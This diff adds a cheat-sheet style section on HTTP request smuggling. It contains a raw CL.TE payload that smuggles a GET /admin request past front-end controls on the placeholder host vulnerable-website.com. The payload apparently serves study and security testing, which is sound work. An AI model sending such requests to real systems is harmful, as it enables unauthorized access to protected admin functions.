@@ -92,3 +92,19 @@ x=
 
 
 ```
+
+## Using HTTP request smuggling to bypass front-end security controls
+```
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+```
